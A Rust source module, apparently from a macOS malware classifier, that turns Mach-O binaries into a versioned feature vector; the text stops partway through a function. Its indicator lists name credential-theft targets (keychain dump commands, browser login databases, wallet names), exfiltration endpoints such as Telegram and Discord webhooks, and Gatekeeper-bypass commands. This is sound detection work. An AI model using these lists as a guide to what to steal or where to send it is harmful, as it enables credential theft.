//! Static Mach-O feature extraction.
//!
//! The vector layout (order, names, meaning) is versioned by [`FEATURES_VERSION`]; any change in
//! order, meaning or count **must** bump it, because the trainer and the shipped model rely on it.
//! Every feature is documented by [`feature_descriptions`] (same order as [`feature_names`]).
//!
//! Conventions:
//! * `*_log2` features are `log2(1 + x)`; counts are raw (capped at [`COUNT_CAP`]); booleans are 0/1.
//! * Features that cannot be computed (absent load command, unparsable blob…) are `0`, never NaN,
//!   so the vector is always fully populated.
//! * For universal binaries the arm64 slice is analysed (else the first slice that parses); the
//!   `fat_*` features describe the container.
//! * `str_*` features count case-insensitive occurrences of indicator strings in string-like sections
//!   (`__cstring`, `__const`, `__rodata`, `__data`, `__oslogstring`, `__ustring` excluded), scanning at
//!   most [`MAX_STRING_SCAN`] bytes; if the slice has none of these sections, the whole slice
//!   (bounded) is scanned instead.
//! * `imp_*` features count distinct imported symbols (bind opcodes, chained fixups and undefined
//!   external symbols, leading `_` stripped, `OBJC_CLASS_$_` prefix stripped) per behaviour family.

use crate::codesig::{self, CodeSignatureSummary};
use crate::macho::{self, FatSlice, CPU_TYPE_ARM64, CPU_TYPE_X86_64};
use crate::MlError;
use aho_corasick::{AhoCorasick, MatchKind};
use goblin::mach::load_command::CommandVariant;
use goblin::mach::MachO;
use std::collections::BTreeSet;
use std::sync::OnceLock;

/// Version of the feature layout. Bump on any change of order, meaning or count.
pub const FEATURES_VERSION: u32 = 1;

/// Counts are capped to this value.
const COUNT_CAP: u64 = 100_000;
/// Max bytes scanned for indicator strings.
const MAX_STRING_SCAN: usize = 16 * 1024 * 1024;
/// Sections smaller than this are ignored for the max-section-entropy feature.
const MIN_ENTROPY_SECTION: usize = 256;
/// Max sections inspected.
const MAX_SECTIONS: usize = 4096;

macro_rules! define_features {
    ($( $id:ident => $name:literal : $doc:literal ),+ $(,)?) => {
        /// Feature indices, in vector order.
        #[allow(non_camel_case_types, dead_code, clippy::upper_case_acronyms)]
        #[derive(Clone, Copy, Debug, PartialEq, Eq)]
        #[repr(usize)]
        pub(crate) enum F { $($id,)+ }
        const FEATURE_NAMES: &[&str] = &[$($name,)+];
        const FEATURE_DOCS: &[&str] = &[$($doc,)+];
    };
}

define_features! {
    // --- container / header -------------------------------------------------------------------
    FileSizeLog2 => "file_size_log2": "log2(1 + total file size in bytes), whole file including all fat slices",
    IsFat => "is_fat": "1 if the file is a universal (fat) binary",
    FatNSlices => "fat_nslices": "number of valid fat slices (1 for a thin binary)",
    FatHasArm64 => "fat_has_arm64": "1 if any slice is arm64 (thin arm64 counts)",
    FatHasX86_64 => "fat_has_x86_64": "1 if any slice is x86_64 (thin x86_64 counts)",
    CpuArm64 => "cpu_arm64": "analysed slice is arm64",
    CpuX86_64 => "cpu_x86_64": "analysed slice is x86_64",
    CpuOther => "cpu_other": "analysed slice is neither arm64 nor x86_64",
    Is64 => "is_64bit": "analysed slice is a 64-bit Mach-O",
    SliceSizeLog2 => "slice_size_log2": "log2(1 + size of the analysed slice)",
    FtExecute => "filetype_execute": "MH_EXECUTE",
    FtDylib => "filetype_dylib": "MH_DYLIB",
    FtBundle => "filetype_bundle": "MH_BUNDLE",
    FtOther => "filetype_other": "any other Mach-O file type",
    Ncmds => "ncmds": "number of load commands",
    SizeofcmdsLog2 => "sizeofcmds_log2": "log2(1 + total size of load commands)",
    FlagPie => "flag_pie": "MH_PIE header flag",
    FlagStackExec => "flag_allow_stack_execution": "MH_ALLOW_STACK_EXECUTION header flag",
    FlagNoHeapExec => "flag_no_heap_execution": "MH_NO_HEAP_EXECUTION header flag",
    FlagTwoLevel => "flag_twolevel": "MH_TWOLEVEL header flag",
    FlagTlv => "flag_has_tlv_descriptors": "MH_HAS_TLV_DESCRIPTORS header flag",
    // --- segments / sections ------------------------------------------------------------------
    NSegments => "n_segments": "number of LC_SEGMENT(_64) commands",
    NSections => "n_sections": "total number of sections",
    HasPagezero => "has_pagezero": "has a __PAGEZERO segment",
    HasRestrict => "has_restrict_segment": "has a __RESTRICT segment or __restrict section (blocks DYLD_* env vars)",
    NWxSegments => "n_wx_segments": "segments whose initial protection is both writable and executable",
    NExecSegments => "n_exec_segments": "segments whose initial protection is executable",
    NNonstdSegments => "n_nonstandard_segments": "segments not named __PAGEZERO/__TEXT/__DATA/__DATA_CONST/__DATA_DIRTY/__LINKEDIT/__AUTH/__AUTH_CONST/__OBJC/__IMPORT",
    TextSizeLog2 => "text_size_log2": "log2(1 + size of __TEXT,__text)",
    DataSizeLog2 => "data_size_log2": "log2(1 + file size of all __DATA* segments)",
    LinkeditSizeLog2 => "linkedit_size_log2": "log2(1 + file size of __LINKEDIT)",
    OverlayLog2 => "overlay_size_log2": "log2(1 + bytes of the slice beyond the end of the last segment's file content)",
    // --- entropy (Shannon, bits per byte, 0..8) -------------------------------------------------
    EntropySlice => "entropy_slice": "entropy of the whole analysed slice",
    EntropyMaxSection => "entropy_max_section": "max entropy over sections of at least 256 bytes",
    EntropyText => "entropy_text": "entropy of __TEXT,__text",
    EntropyData => "entropy_data": "entropy of the file content of all __DATA* segments",
    NHighEntropySections => "n_high_entropy_sections": "sections of at least 1 KiB with entropy > 7.2",
    // --- dylibs / load commands ---------------------------------------------------------------
    NDylibs => "n_dylibs": "LC_LOAD_DYLIB + LC_LOAD_WEAK_DYLIB + LC_REEXPORT_DYLIB + LC_LAZY_LOAD_DYLIB + LC_LOAD_UPWARD_DYLIB",
    NWeakDylibs => "n_weak_dylibs": "LC_LOAD_WEAK_DYLIB count",
    NReexportDylibs => "n_reexport_dylibs": "LC_REEXPORT_DYLIB count",
    NRpaths => "n_rpaths": "LC_RPATH count",
    NDylibsRelative => "n_dylibs_relative": "dylib paths starting with @rpath/@executable_path/@loader_path",
    NDylibsNonSystem => "n_dylibs_nonsystem": "absolute dylib paths outside /usr/lib/ and /System/",
    LinksSecurity => "links_security_framework": "links Security.framework",
    LinksIokit => "links_iokit": "links IOKit.framework",
    LinksAppkit => "links_appkit": "links AppKit.framework or Cocoa.framework",
    LinksFoundation => "links_foundation": "links Foundation.framework",
    LinksCurl => "links_libcurl": "links /usr/lib/libcurl",
    LinksOsakit => "links_osakit": "links OSAKit.framework or AppleScriptObjC.framework",
    HasMain => "has_lc_main": "has LC_MAIN",
    HasUnixthread => "has_unixthread": "has LC_UNIXTHREAD (legacy entry point)",
    HasDyldInfo => "has_dyld_info": "has LC_DYLD_INFO(_ONLY)",
    HasChainedFixups => "has_chained_fixups": "has LC_DYLD_CHAINED_FIXUPS",
    HasFunctionStarts => "has_function_starts": "has LC_FUNCTION_STARTS",
    HasDataInCode => "has_data_in_code": "has LC_DATA_IN_CODE",
    HasBuildVersion => "has_build_version": "has LC_BUILD_VERSION or LC_VERSION_MIN_MACOSX",
    MinOs => "min_os_version": "minimum OS version as major + minor/100 (0 if absent)",
    SdkVersion => "sdk_version": "SDK version as major + minor/100 (0 if absent)",
    HasEncryption => "has_encryption_info": "has LC_ENCRYPTION_INFO(_64)",
    Cryptid => "cryptid": "cryptid of LC_ENCRYPTION_INFO(_64) (0 if absent)",
    NUnknownCmds => "n_unknown_load_commands": "load commands goblin does not recognise",
    // --- code signature -------------------------------------------------------------------------
    HasCodeSig => "has_code_signature": "LC_CODE_SIGNATURE present with a parsable SuperBlob",
    CodeSigSizeLog2 => "codesig_size_log2": "log2(1 + code signature size)",
    CsAdhoc => "cs_adhoc": "CodeDirectory flag CS_ADHOC",
    CsRuntime => "cs_hardened_runtime": "CodeDirectory flag CS_RUNTIME",
    CsLinkerSigned => "cs_linker_signed": "CodeDirectory flag CS_LINKER_SIGNED",
    CsHasCms => "cs_has_cms": "non-empty CMS (certificate) signature blob",
    CsHasTeamId => "cs_has_team_id": "CodeDirectory records a team identifier",
    CsHasRequirements => "cs_has_requirements": "internal requirements blob present",
    HasEntitlements => "has_entitlements": "XML or DER entitlements blob present",
    EntNKeys => "ent_n_keys": "number of <key> elements in the XML entitlements",
    EntGetTaskAllow => "ent_get_task_allow": "entitlement com.apple.security.get-task-allow",
    EntDisableLibVal => "ent_disable_library_validation": "entitlement com.apple.security.cs.disable-library-validation",
    EntUnsignedExecMem => "ent_allow_unsigned_exec_memory": "entitlement cs.allow-unsigned-executable-memory or cs.allow-jit",
    EntDyldEnv => "ent_allow_dyld_env": "entitlement cs.allow-dyld-environment-variables",
    EntAppSandbox => "ent_app_sandbox": "entitlement com.apple.security.app-sandbox",
    // --- symbols --------------------------------------------------------------------------------
    NImports => "n_imports": "distinct imported symbol names",
    NExports => "n_exports": "exported symbols (export trie, else defined external symtab entries)",
    NSymbols => "n_symbols": "symbol table entries (capped)",
    HasObjc => "has_objc": "has __objc_* sections",
    HasSwift => "has_swift": "has __swift5_* sections",
    IsGo => "is_go": "has Go-specific sections (__go_buildinfo, __gopclntab, __gosymtab)",
    // --- import families (distinct imported symbols per family) ---------------------------------
    ImpNetwork => "imp_network": "socket/connect/getaddrinfo/send/recv, curl_*, CFSocket/CFStream/CFHTTP, NSURLSession/NSURLConnection, nw_connection_*",
    ImpExec => "imp_exec": "execve/execv*/posix_spawn*/system/popen/fork, NSTask, NSAppleScript, OSAScript, AuthorizationExecuteWithPrivileges",
    ImpKeychain => "imp_keychain": "SecItemCopyMatching, SecItemExport, SecKeychain*",
    ImpAntidebug => "imp_antidebug": "ptrace, sysctl, sysctlbyname, getppid, task_get_exception_ports, csops",
    ImpDynload => "imp_dynload": "dlopen/dlsym, NSCreateObjectFileImageFromMemory, NSLinkModule, NSAddImage, _dyld_get_image_name",
    ImpCrypto => "imp_crypto": "CCCrypt*, CC_MD5/SHA1/SHA256, CCHmac, CCKeyDerivationPBKDF, SecKeyCreateEncryptedData, EVP_*",
    ImpCapture => "imp_capture": "CGWindowListCreateImage, CGDisplayCreateImage*, CGEventTap*, screen-capture access, AVCapture*, ScreenCaptureKit, IOHIDManager*, AXIsProcessTrusted*",
    ImpFileEnum => "imp_file_enum": "opendir/readdir, fts_*, getdirentries, getattrlistbulk, glob, nftw/ftw, scandir, NSDirectoryEnumerator",
    ImpPrivilege => "imp_privilege": "setuid/seteuid/setgid/setegid, AuthorizationCreate/CopyRights, SMJobBless, SMJobSubmit",
    ImpPersistence => "imp_persistence": "LSSharedFileListCreate/InsertItemURL, SMLoginItemSetEnabled, SMAppService",
    ImpInjection => "imp_process_injection": "task_for_pid, mach_vm_write/read/protect, vm_write, thread_create_running, thread_set_state, task_threads, processor_set_tasks",
    ImpPasteboard => "imp_pasteboard": "NSPasteboard, PasteboardCreate, PasteboardCopyItemFlavorData",
    ImpSysinfo => "imp_sysinfo": "IORegistryEntryCreateCFProperty, IOServiceGetMatchingService, IOServiceMatching, gethostuuid, proc_listpids/proc_pidpath/proc_pidinfo, getifaddrs, CWWiFiClient, SCDynamicStoreCopyComputerName",
    NImportFamilies => "n_import_families": "number of imp_* families with at least one import",
    // --- strings --------------------------------------------------------------------------------
    StringsBytesLog2 => "strings_bytes_log2": "log2(1 + bytes scanned for strings)",
    NPrintableLog2 => "n_printable_strings_log2": "log2(1 + number of printable ASCII runs of length >= 6)",
    StrOsascript => "str_osascript": "\"osascript\"",
    StrDisplayDialog => "str_display_dialog": "\"display dialog\"",
    StrHiddenAnswer => "str_hidden_answer": "\"hidden answer\"",
    StrLaunchAgents => "str_launch_agents": "\"LaunchAgents\", \"LaunchDaemons\"",
    StrKeychain => "str_keychain": "\"keychain\"",
    StrWallet => "str_wallet": "\"wallet\"",
    StrTelegram => "str_telegram": "\"telegram\"",
    StrCurl => "str_curl": "\"curl \"",
    StrBase64 => "str_base64": "\"base64\"",
    StrTmp => "str_tmp": "\"/tmp/\"",
    StrChmodX => "str_chmod_x": "\"chmod +x\", \"chmod 777\", \"chmod 755\"",
    StrQuarantine => "str_quarantine_xattr": "\"com.apple.quarantine\"",
    StrXattrCmd => "str_xattr_cmd": "\"xattr -d\", \"xattr -c\", \"xattr -r\"",
    StrChrome => "str_browser_chrome": "\"Google/Chrome\"",
    StrFirefox => "str_browser_firefox": "\"Firefox/Profiles\"",
    StrBrowserOther => "str_browser_other": "\"BraveSoftware\", \"Microsoft Edge\", \"Opera Software\", \"com.operasoftware\", \"Vivaldi\", \"Yandex\", \"Chromium\", \"Arc/User Data\"",
    StrCookies => "str_cookies": "\"Cookies\"",
    StrLoginData => "str_login_data": "\"Login Data\", \"logins.json\", \"key4.db\"",
    StrCryptoWallets => "str_crypto_wallets": "\"Exodus\", \"Electrum\", \"MetaMask\", \"Coinomi\", \"Atomic Wallet\", \"Ledger Live\", \"Trezor\", \"Binance\", \"Guarda\", \"wallet.dat\", MetaMask/Phantom extension ids",
    StrPassword => "str_password": "\"password\"",
    StrSudo => "str_sudo": "\"sudo \"",
    StrShell => "str_shell": "\"/bin/sh\", \"/bin/bash\", \"/bin/zsh\"",
    StrShC => "str_sh_c": "\"sh -c\", \"bash -c\", \"zsh -c\"",
    StrHttp => "str_http": "\"http://\"",
    StrHttps => "str_https": "\"https://\"",
    StrLaunchctl => "str_launchctl": "\"launchctl\"",
    StrPlistKeys => "str_plist_launch_keys": "\"RunAtLoad\", \"KeepAlive\", \"ProgramArguments\"",
    StrScreencapture => "str_screencapture": "\"screencapture\"",
    StrSystemProfiler => "str_system_profiler": "\"system_profiler\"",
    StrVm => "str_vm_detect": "\"VMware\", \"VirtualBox\", \"VBox\", \"Parallels\", \"QEMU\"",
    StrDscl => "str_dscl": "\"dscl\"",
    StrSecurityCmd => "str_security_cmd": "\"find-generic-password\", \"find-internet-password\", \"dump-keychain\"",
    StrArchiveCmd => "str_archive_cmd": "\"ditto -c\", \"zip -r\"",
    StrCrontab => "str_crontab": "\"crontab\"",
    StrNohup => "str_nohup": "\"nohup\"",
    StrKillall => "str_killall": "\"killall\"",
    StrIoplatform => "str_ioplatform": "\"IOPlatformExpertDevice\", \"IOPlatformUUID\", \"IOPlatformSerialNumber\"",
    StrExfilApi => "str_exfil_api": "\"api.telegram.org\", \"discord.com/api/webhooks\", \"discordapp.com/api/webhooks\", \"pastebin.com\", \"ngrok\"",
    StrPersonalData => "str_personal_data": "\"NoteStore.sqlite\", \"Cookies.binarycookies\", \"AddressBook\", \"chat.db\"",
    StrUsersShared => "str_users_shared": "\"/Users/Shared\"",
    StrGatekeeper => "str_gatekeeper": "\"spctl\", \"master-disable\", \"csrutil\"",
    StrTcc => "str_tcc": "\"TCC.db\", \"com.apple.TCC\", \"tccutil\"",
    StrLoginItems => "str_login_items": "\"login item\", \"LoginItems\"",
}

/// Names of the features, in vector order (the trainer's column names).
pub fn feature_names() -> &'static [&'static str] {
    FEATURE_NAMES
}

/// One-line description of every feature, same order as [`feature_names`].
pub fn feature_descriptions() -> &'static [&'static str] {
    FEATURE_DOCS
}

/// Indicator strings → feature (all matched ASCII-case-insensitively).
const STRING_PATTERNS: &[(&str, F)] = &[
    ("osascript", F::StrOsascript),
    ("display dialog", F::StrDisplayDialog),
    ("hidden answer", F::StrHiddenAnswer),
    ("LaunchAgents", F::StrLaunchAgents),
    ("LaunchDaemons", F::StrLaunchAgents),
    ("keychain", F::StrKeychain),
    ("wallet", F::StrWallet),
    ("telegram", F::StrTelegram),
    ("curl ", F::StrCurl),
    ("base64", F::StrBase64),
    ("/tmp/", F::StrTmp),
    ("chmod +x", F::StrChmodX),
    ("chmod 777", F::StrChmodX),
    ("chmod 755", F::StrChmodX),
    ("com.apple.quarantine", F::StrQuarantine),
    ("xattr -d", F::StrXattrCmd),
    ("xattr -c", F::StrXattrCmd),
    ("xattr -r", F::StrXattrCmd),
    ("Google/Chrome", F::StrChrome),
    ("Firefox/Profiles", F::StrFirefox),
    ("BraveSoftware", F::StrBrowserOther),
    ("Microsoft Edge", F::StrBrowserOther),
    ("Opera Software", F::StrBrowserOther),
    ("com.operasoftware", F::StrBrowserOther),
    ("Vivaldi", F::StrBrowserOther),
    ("Yandex", F::StrBrowserOther),
    ("Chromium", F::StrBrowserOther),
    ("Arc/User Data", F::StrBrowserOther),
    ("Cookies", F::StrCookies),
    ("Login Data", F::StrLoginData),
    ("logins.json", F::StrLoginData),
    ("key4.db", F::StrLoginData),
    ("Exodus", F::StrCryptoWallets),
    ("Electrum", F::StrCryptoWallets),
    ("MetaMask", F::StrCryptoWallets),
    ("Coinomi", F::StrCryptoWallets),
    ("Atomic Wallet", F::StrCryptoWallets),
    ("Ledger Live", F::StrCryptoWallets),
    ("Trezor", F::StrCryptoWallets),
    ("Binance", F::StrCryptoWallets),
    ("Guarda", F::StrCryptoWallets),
    ("wallet.dat", F::StrCryptoWallets),
    ("nkbihfbeogaeaoehlefnkodbefgpgknn", F::StrCryptoWallets),
    ("bfnaelmomeimhlpmgjnjophhpkkoljpa", F::StrCryptoWallets),
    ("password", F::StrPassword),
    ("sudo ", F::StrSudo),
    ("/bin/sh", F::StrShell),
    ("/bin/bash", F::StrShell),
    ("/bin/zsh", F::StrShell),
    ("sh -c", F::StrShC),
    ("http://", F::StrHttp),
    ("https://", F::StrHttps),
    ("launchctl", F::StrLaunchctl),
    ("RunAtLoad", F::StrPlistKeys),
    ("KeepAlive", F::StrPlistKeys),
    ("ProgramArguments", F::StrPlistKeys),
    ("screencapture", F::StrScreencapture),
    ("system_profiler", F::StrSystemProfiler),
    ("VMware", F::StrVm),
    ("VirtualBox", F::StrVm),
    ("VBox", F::StrVm),
    ("Parallels", F::StrVm),
    ("QEMU", F::StrVm),
    ("dscl", F::StrDscl),
    ("find-generic-password", F::StrSecurityCmd),
    ("find-internet-password", F::StrSecurityCmd),
    ("dump-keychain", F::StrSecurityCmd),
    ("ditto -c", F::StrArchiveCmd),
    ("zip -r", F::StrArchiveCmd),
    ("crontab", F::StrCrontab),
    ("nohup", F::StrNohup),
    ("killall", F::StrKillall),
    ("IOPlatformExpertDevice", F::StrIoplatform),
    ("IOPlatformUUID", F::StrIoplatform),
    ("IOPlatformSerialNumber", F::StrIoplatform),
    ("api.telegram.org", F::StrExfilApi),
    ("discord.com/api/webhooks", F::StrExfilApi),
    ("discordapp.com/api/webhooks", F::StrExfilApi),
    ("pastebin.com", F::StrExfilApi),
    ("ngrok", F::StrExfilApi),
    ("NoteStore.sqlite", F::StrPersonalData),
    ("Cookies.binarycookies", F::StrPersonalData),
    ("AddressBook", F::StrPersonalData),
    ("chat.db", F::StrPersonalData),
    ("/Users/Shared", F::StrUsersShared),
    ("spctl", F::StrGatekeeper),
    ("master-disable", F::StrGatekeeper),
    ("csrutil", F::StrGatekeeper),
    ("TCC.db", F::StrTcc),
    ("com.apple.TCC", F::StrTcc),
    ("tccutil", F::StrTcc),
    ("login item", F::StrLoginItems),
    ("LoginItems", F::StrLoginItems),
];

/// Import families: exact names, or prefixes when the pattern ends with `*`.
const IMPORT_FAMILIES: &[(F, &[&str])] = &[
    (
        F::ImpNetwork,
        &[
            "socket",
            "connect",
            "listen",
            "accept",
            "getaddrinfo",
            "gethostbyname",
            "gethostbyname2",
            "send",
            "sendto",
            "recv",
            "recvfrom",
            "curl_*",
            "CFSocketCreate",
            "CFStreamCreatePairWithSocketToHost",
            "CFHTTPMessageCreateRequest",
            "CFReadStreamCreateForHTTPRequest",
            "NSURLSession",
            "NSURLConnection",
            "NSURLRequest",
            "NSMutableURLRequest",
            "nw_connection_*",
            "SCNetworkReachabilityCreateWithName",
        ],
    ),
    (
        F::ImpExec,
        &[
            "execve",
            "execv",
            "execvp",
            "execvP",
            "execl",
            "execlp",
            "execle",
            "posix_spawn",
            "posix_spawnp",
            "system",
            "popen",
            "fork",
            "vfork",
            "NSTask",
            "NSAppleScript",
            "OSAScript",
            "NSUserAppleScriptTask",
            "NSUserUnixTask",
            "AuthorizationExecuteWithPrivileges",
        ],
    ),
    (
        F::ImpKeychain,
        &["SecItemCopyMatching", "SecItemExport", "SecKeychain*"],
    ),
    (
        F::ImpAntidebug,
        &[
            "ptrace",
            "sysctl",
            "sysctlbyname",
            "getppid",
            "task_get_exception_ports",
            "csops",
        ],
    ),
    (
        F::ImpDynload,
        &[
            "dlopen",
            "dlsym",
            "dlopen_preflight",
            "NSCreateObjectFileImageFromMemory",
            "NSLinkModule",
            "NSAddImage",
            "_dyld_get_image_name",
        ],
    ),
    (
        F::ImpCrypto,
        &[
            "CCCrypt*",
            "CC_MD5",
            "CC_SHA1",
            "CC_SHA256",
            "CC_SHA512",
            "CCHmac*",
            "CCKeyDerivationPBKDF",
            "SecKeyCreateEncryptedData",
            "EVP_*",
        ],
    ),
    (
        F::ImpCapture,
        &[
            "CGWindowListCreateImage",
            "CGWindowListCopyWindowInfo",
            "CGDisplayCreateImage*",
            "CGEventTap*",
            "CGPreflightScreenCaptureAccess",
            "CGRequestScreenCaptureAccess",
            "AVCaptureDevice",
            "AVCaptureSession",
            "AVCaptureScreenInput",
            "SCShareableContent",
            "SCScreenshotManager",
            "SCStream",
            "IOHIDManager*",
            "AXIsProcessTrusted*",
            "AXUIElementCreateSystemWide",
        ],
    ),
    (
        F::ImpFileEnum,
        &[
            "opendir",
            "readdir",
            "readdir_r",
            "fts_open",
            "fts_read",
            "getdirentries",
            "getattrlistbulk",
            "glob",
            "nftw",
            "ftw",
            "scandir",
            "NSDirectoryEnumerator",
        ],
    ),
    (
        F::ImpPrivilege,
        &[
            "setuid",
            "seteuid",
            "setgid",
            "setegid",
            "AuthorizationCreate",
            "AuthorizationCopyRights",
            "SMJobBless",
            "SMJobSubmit",
        ],
    ),
    (
        F::ImpPersistence,
        &[
            "LSSharedFileListCreate",
            "LSSharedFileListInsertItemURL",
            "SMLoginItemSetEnabled",
            "SMAppService",
        ],
    ),
    (
        F::ImpInjection,
        &[
            "task_for_pid",
            "mach_vm_write",
            "mach_vm_read",
            "mach_vm_protect",
            "vm_write",
            "thread_create_running",
            "thread_set_state",
            "task_threads",
            "processor_set_tasks",
        ],
    ),
    (
        F::ImpPasteboard,
        &[
            "NSPasteboard",
            "PasteboardCreate",
            "PasteboardCopyItemFlavorData",
        ],
    ),
    (
        F::ImpSysinfo,
        &[
            "IORegistryEntryCreateCFProperty",
            "IOServiceGetMatchingService",
            "IOServiceMatching",
            "gethostuuid",
            "proc_listpids",
            "proc_pidpath",
            "proc_pidinfo",
            "getifaddrs",
            "CWWiFiClient",
            "SCDynamicStoreCopyComputerName",
        ],
    ),
];

const STANDARD_SEGMENTS: &[&str] = &[
    "__PAGEZERO",
    "__TEXT",
    "__DATA",
    "__DATA_CONST",
    "__DATA_DIRTY",
    "__LINKEDIT",
    "__AUTH",
    "__AUTH_CONST",
    "__OBJC",
    "__IMPORT",
];
const STRING_SECTIONS: &[&str] = &[
    "__cstring",
    "__const",
    "__rodata",
    "__data",
    "__oslogstring",
];

const MH_EXECUTE: u32 = 0x2;
const MH_DYLIB: u32 = 0x6;
const MH_BUNDLE: u32 = 0x8;
const MH_TWOLEVEL: u32 = 0x80;
const MH_ALLOW_STACK_EXECUTION: u32 = 0x2_0000;
const MH_PIE: u32 = 0x20_0000;
const MH_HAS_TLV_DESCRIPTORS: u32 = 0x80_0000;
const MH_NO_HEAP_EXECUTION: u32 = 0x100_0000;
const VM_PROT_WRITE: u32 = 0x2;
const VM_PROT_EXECUTE: u32 = 0x4;
const N_STAB: u8 = 0xe0;
const N_TYPE: u8 = 0x0e;
const N_EXT: u8 = 0x01;
const N_PEXT: u8 = 0x10;
const N_UNDF: u8 = 0x0;
const N_SECT: u8 = 0xe;

/// Fixed-length feature vector with bounds-checked setters.
struct Fv(Vec<f32>);

impl Fv {
    fn new() -> Self {
        Self(vec![0.0; FEATURE_NAMES.len()])
    }
    fn set(&mut self, f: F, v: f32) {
        if let Some(slot) = self.0.get_mut(f as usize) {
            *slot = if v.is_finite() { v } else { 0.0 };
        }
    }
    fn flag(&mut self, f: F, b: bool) {
        self.set(f, if b { 1.0 } else { 0.0 });
    }
    fn count(&mut self, f: F, n: u64) {
        self.set(f, n.min(COUNT_CAP) as f32);
    }
    fn log2(&mut self, f: F, n: u64) {
        self.set(f, lg(n));
    }
}

fn lg(n: u64) -> f32 {
    ((n as f64) + 1.0).log2() as f32
}

/// Shannon entropy (bits/byte) of a byte histogram.
fn entropy_of(hist: &[u64; 256], total: u64) -> f32 {
    if total == 0 {
        return 0.0;
    }
    let t = total as f64;
    let mut h = 0.0f64;
    for &c in hist.iter() {
        if c > 0 {
            let p = c as f64 / t;
            h -= p * p.log2();
        }
    }
    h as f32
}

fn histogram(bytes: &[u8], hist: &mut [u64; 256]) {
    for &b in bytes {
        hist[b as usize] += 1;
    }
}

fn entropy(bytes: &[u8]) -> f32 {
    let mut hist = [0u64; 256];
    histogram(bytes, &mut hist);
    entropy_of(&hist, bytes.len() as u64)
}

fn name_str(raw: &[u8; 16]) -> &str {
    let end = raw.iter().position(|&c| c == 0).unwrap_or(16);
    std::str::from_utf8(&raw[..end]).unwrap_or("")
}

/// Packed `xxxx.yy.zz` version → `major + minor/100`.
fn version_value(v: u32) -> f32 {
    (v >> 16) as f32 + ((v >> 8) & 0xff) as f32 / 100.0
}

/// Extracts the feature vector of a Mach-O (thin or universal). See the module docs for the layout.
///
/// Never panics: the parser runs under `catch_unwind` as a last guard.
pub fn extract_features(bytes: &[u8]) -> Result<Vec<f32>, MlError> {
    if !crate::looks_like_macho(bytes) {
        return Err(MlError::NotMachO);
    }
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| extract_inner(bytes))) {
        Ok(r) => r,
        Err(_) => Err(MlError::Malformed("parser panicked".into())),
    }
}

fn thin_cputype(bytes: &[u8]) -> u32 {
    // Thin magic tells the endianness of the header.
    let le = matches!(bytes.first(), Some(0xce) | Some(0xcf));
    macho::read_u32(bytes, 4, le).unwrap_or(0)
}

fn extract_inner(bytes: &[u8]) -> Result<Vec<f32>, MlError> {
    let mut fv = Fv::new();
    fv.log2(F::FileSizeLog2, bytes.len() as u64);

    let (slices, is_fat) = match macho::parse_fat(bytes)? {
        Some(s) => (s, true),
        None => (
            vec![FatSlice {
                cputype: thin_cputype(bytes),
                offset: 0,
                size: bytes.len(),
            }],
            false,
        ),
    };
    fv.flag(F::IsFat, is_fat);
    fv.count(F::FatNSlices, slices.len() as u64);
    fv.flag(
        F::FatHasArm64,
        slices.iter().any(|s| s.cputype == CPU_TYPE_ARM64),
    );
    fv.flag(
        F::FatHasX86_64,
        slices.iter().any(|s| s.cputype == CPU_TYPE_X86_64),
    );

    let (_slice, data, m) = macho::select_slice(bytes, &slices)?;
    header_features(&mut fv, data, &m);
    let sections = segment_features(&mut fv, data, &m);
    load_command_features(&mut fv, data, &m);
    let sig = codesig::summary_for(data, &m);
    signature_features(&mut fv, &sig);
    let imports = collect_imports(data, &m);
    import_features(&mut fv, &imports);
    export_and_symbol_features(&mut fv, data, &m);
    string_features(&mut fv, data, &sections);
    Ok(fv.0)
}

fn header_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
    let h = &m.header;
    fv.flag(F::CpuArm64, h.cputype == CPU_TYPE_ARM64);
    fv.flag(F::CpuX86_64, h.cputype == CPU_TYPE_X86_64);
    fv.flag(
        F::CpuOther,
        h.cputype != CPU_TYPE_ARM64 && h.cputype != CPU_TYPE_X86_64,
    );
    fv.flag(F::Is64, m.is_64);
    fv.log2(F::SliceSizeLog2, data.len() as u64);
    fv.flag(F::FtExecute, h.filetype == MH_EXECUTE);
    fv.flag(F::FtDylib, h.filetype == MH_DYLIB);
    fv.flag(F::FtBundle, h.filetype == MH_BUNDLE);
    fv.flag(
        F::FtOther,
        !matches!(h.filetype, MH_EXECUTE | MH_DYLIB | MH_BUNDLE),
    );
    fv.count(F::Ncmds, h.ncmds as u64);
    fv.log2(F::SizeofcmdsLog2, u64::from(h.sizeofcmds));
    fv.flag(F::FlagPie, h.flags & MH_PIE != 0);
    fv.flag(F::FlagStackExec, h.flags & MH_ALLOW_STACK_EXECUTION != 0);
    fv.flag(F::FlagNoHeapExec, h.flags & MH_NO_HEAP_EXECUTION != 0);
    fv.flag(F::FlagTwoLevel, h.flags & MH_TWOLEVEL != 0);
    fv.flag(F::FlagTlv, h.flags & MH_HAS_TLV_DESCRIPTORS != 0);
    fv.set(F::EntropySlice, entropy(data));
}

/// Name and content of a section (content empty for zerofill / out-of-bounds sections).
struct SectionInfo<'a> {
    segname: String,
    sectname: String,
    data: &'a [u8],
}

fn segment_features<'a>(fv: &mut Fv, data: &'a [u8], m: &MachO<'a>) -> Vec<SectionInfo<'a>> {
    let mut sections = Vec::new();
    let mut n_wx = 0u64;
    let mut n_x = 0u64;
    let mut n_nonstd = 0u64;
    let mut restrict = false;
    let mut pagezero = false;
    let mut data_hist = [0u64; 256];
    let mut data_total = 0u64;
    let mut linkedit = 0u64;
    let mut max_end = 0u64;
    for seg in m.segments.iter() {
        let name = name_str(&seg.segname).to_owned();
        if seg.initprot & VM_PROT_EXECUTE != 0 {
            n_x += 1;
            if seg.initprot & VM_PROT_WRITE != 0 {
                n_wx += 1;
            }
        }
        if !STANDARD_SEGMENTS.contains(&name.as_str()) {
            n_nonstd += 1;
        }
        if name == "__RESTRICT" {
            restrict = true;
        }
        if name == "__PAGEZERO" {
            pagezero = true;
        }
        if name.starts_with("__DATA") {
            histogram(seg.data, &mut data_hist);
            data_total += seg.data.len() as u64;
        }
        if name == "__LINKEDIT" {
            linkedit = seg.filesize;
        }
        if seg.filesize > 0 {
            max_end = max_end.max(seg.fileoff.saturating_add(seg.filesize));
        }
        for sect in seg {
            if sections.len() >= MAX_SECTIONS {
                break;
            }
            let Ok((s, content)) = sect else { break };
            sections.push(SectionInfo {
                segname: name_str(&s.segname).to_owned(),
                sectname: name_str(&s.sectname).to_owned(),
                data: content,
            });
        }
    }
    fv.count(F::NSegments, m.segments.len() as u64);
    fv.count(F::NSections, sections.len() as u64);
    fv.flag(F::HasPagezero, pagezero);
